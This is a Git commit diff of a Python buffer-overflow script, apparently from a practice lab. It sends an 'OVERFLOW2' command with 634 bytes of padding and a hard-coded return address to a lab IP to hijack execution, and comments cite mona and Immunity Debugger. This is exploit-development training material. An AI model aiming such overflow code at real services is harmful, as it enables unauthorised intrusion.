d8ce72a624ce787ceac4de45968e75c1126fadea
MJWyattCyber <66680297+MJWyattCyber@users.noreply.github.com>
2021-10-11 21:14:37 +0100

    Update to right_module
    updated to python3 and added encoded

--- finding_the_right_module.py
+++ finding_the_right_module.py
@@ -1,20 +1,20 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 import sys, socket
 
-returnaddress = "\xaf\x11\x50\x62" #This can be gathered from the result of our mona find command within Immunity, remember it will need to be written backwards and in 2 byte sections.
+returnaddress = "\xbb\x11\x50\x62" #This can be gathered from the result of our mona find command within Immunity, remember it will need to be written backwards and in 2 byte sections.
 
-shellcode = "A" * 2003 + returnaddress
-address = '127.0.0.1' #CHANGE THIS
-port = 9999 #CHANGE THIS
-vulncommand = 'TRUN /.:/' # CHANGE THIS, the vulnerable command that was found in the spiking section would go here
+shellcode = "A" * 634 + returnaddress
+address = '10.10.211.46' #CHANGE THIS
+port = 1337 #CHANGE THIS
+vulncommand = 'OVERFLOW2 ' # CHANGE THIS, the vulnerable command that was found in the spiking section would go here
 
 try:
-	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	s.connect((address,port))
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect((address,port))
 
-	s.send((vulncommand + shellcode))
-	s.close()
+        s.send(bytes(vulncommand + shellcode, "latin-1"))
+        s.close()
 
 except:
-	print "Error connecting to server"
-	sys.exit()
+        print("Error connecting to server")
+        sys.exit()
